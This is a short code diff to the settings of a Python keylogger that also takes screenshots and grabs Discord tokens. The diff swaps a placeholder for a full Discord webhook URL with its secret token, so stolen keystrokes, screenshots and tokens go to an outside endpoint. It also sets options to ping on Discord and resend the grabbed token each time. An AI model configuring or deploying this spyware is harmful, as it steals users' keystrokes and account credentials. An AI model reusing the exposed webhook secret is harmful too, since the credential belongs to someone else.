@@ -6,8 +6,8 @@ import time
 
 DelayTime = 1  # In minute
 DelayTimeScreen = 2  # In second
-webhook_url = "WEBHOOK HERE"  # YOUR_WEBHOOK_HERE
-name_of_keylogger_file = "exemple1"  # YOUR_KEYLOGGER_FILE_NAME
+webhook_url = "https://discord.com/api/webhooks/1258589178552254546/0dUMMMW-Q4PK17WhhibS6ouPi-lOs2u4JTVK7d9lPL46BVS4WMgWKCfvPYgj91mH9nHc"  # YOUR_WEBHOOK_HERE
+name_of_keylogger_file = "prueba"  # YOUR_KEYLOGGER_FILE_NAME
 name_of_folder_picture = "exemple2"  # YOUR_PICTURE_FOLDER_NAME
 ping_me = True  # PING ON DISCORD
 send_token_every_time = True  # if it is on false the token grabber will be sent only at the start of the script
